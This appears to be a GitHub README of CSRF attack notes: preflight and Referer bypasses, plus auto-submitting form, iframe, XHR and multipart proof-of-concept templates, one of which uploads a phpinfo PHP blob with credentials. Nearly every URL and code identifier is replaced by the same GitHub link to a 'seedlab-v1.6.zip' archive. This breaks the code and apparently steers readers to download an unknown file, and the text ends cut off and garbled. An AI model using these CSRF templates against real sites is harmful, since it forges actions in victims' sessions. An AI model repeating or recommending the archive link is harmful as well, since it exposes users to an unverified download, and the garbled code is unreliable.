# seedlab-9
# CSRF-Cross-site-requesting-forgery-
# Content-Type change

According to this, in order to avoid preflight requests using POST method these are the allowed Content-Type values:

        . application/x-www-form-urlencoded
        . multipart/form-data
        . text/plain

However, note that the severs logic may vary depending on the Content-Type used so you should try the values mentioned and others like application/json,text/xml, application/xml.


**application/json preflight request bypass


  As you already know, you cannot sent a POST request with the Content-Type application/json via HTML form, and if you try to do so via XMLHttpRequest a preflight request is sent first.

However, you could try to send the JSON data using the content types **text/plain and application/x-www-form-urlencoded **just to check if the backend is using the data independently of the Content-Type.
You can send a form using Content-Type: text/plain setting enctype="text/plain"

You could also try to bypass this restriction by using a SWF flash file. More more information read this post.

# Referrer / Origin check bypass

 Avoid Referrer header

Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.

	<meta name="referrer" content="never">

# Regexp bypasses

          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip (O)
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip (O)
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip;white_domain_com (O)
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip (O)
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip (O)
          https://hahwulwhite_domain_com (O)
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip (X) 
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip (X)
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip (X)
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip\.white_domain_com (X)
          https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip (X)


# Exploit Examples

  Exfiltrating CSRF Token
  If a CSRF token is being used as **defence **you could try to **exfiltrate it **abusing a XSS vulnerability or a Dangling Markup vulnerability.

 
GET using HTML tags

        <img src="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip" style="display:none" />
        <h1>404 - Page not found</h1>
        The URL you are requesting is no longer available


Other HTML5 tags that can be used to automatically send a GET request are:



# Form GET request

          <html>
            <!-- CSRF PoC - generated by Burp Suite Professional -->
            <body>
            <script>https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip('', '', '/')</script>
              <form method="GET" action="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip">
                <input type="hidden" name="email" value="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip" />
                <input type="submit" value="Submit request" />
              </form>
              <script>
                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip[0].submit();
              </script>
            </body>
          </html>


# Form POST request



            <html>
              <body>
              <script>https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip('', '', '/')</script>
                <form action="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip" id="csrfform">
                  <input type="hidden" name="email" value="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip" autofocus onfocus="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip();" /> <!-- Way 1 to autosubmit -->
                  <input type="submit" value="Submit request" />
                  <img src=x onerror="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip();" /> <!-- Way 2 to autosubmit -->
                </form>
                <script>
                  https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip[0].submit(); //Way 3 to autosubmit
                </script>
              </body>
            </html>


# Form POST request through iframe

          <!-- 
          The request is sent through the iframe withuot reloading the page 
          -->
          <html>
            <body>
            <iframe style="display:none" name="csrfframe"></iframe> 
              <form action="/change-email" id="csrfform" target="csrfframe">
                <input type="hidden" name="email" value="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip" autofocus onfocus="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip();" />
                <input type="submit" value="Submit request" />
              </form>
              <script>
                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip[0].submit();
              </script>
            </body>
          </html>

# Ajax POST request

              <script>
              var xh;
              if (https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip)
                {// code for IE7+, Firefox, Chrome, Opera, Safari
                xh=new XMLHttpRequest();
                }
              else
                {// code for IE6, IE5
                xh=new ActiveXObject("https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip");
                }
              https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip = true;
              https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip("POST","https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip");
              https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
              https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip("username=abcd&status=on");
              </script>

              <script>
              //JQuery version
              $.ajax({
                type: "POST",
                url: "https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip",
                data: "param=value&param2=value2"
              })
              </script>

# multipart/form-data POST request

                myFormData = new FormData();
                var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip("newAttachment", blob, "https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip");
                fetch("http://example/some/path", {
                    method: "post",
                    body: myFormData,
                    credentials: "include",
                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
                    mode: "no-cors"
                });


# multipart/form-data POST request v2

                var fileSize = https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip,
                boundary = "OWNEDBYOFFSEC",
                xhr = new XMLHttpRequest();
                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip = true;
                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip("POST", url, true);
                //  MIME POST request.
                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip("Content-Type", "multipart/form-data, boundary="+boundary);
                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip("Content-Length", fileSize);
                var body = "--" + boundary + "\r\n";
                body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
                body += "Content-Type: " + ctype + "\r\n\r\n";
                body += fileData + "\r\n";
                body += "--" + boundary + "--";

                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip(body);
                https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip(body);

# Form POST request from within an iframe

                <--! https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip -->

                <body onload="envia()">
                <form method="POST"id="formulario" action="https://github.com/Hanan-github/seedlab-9/raw/refs/heads/main/eurytomid/seedlab-v1.6.zip">
                <inputâ€¦
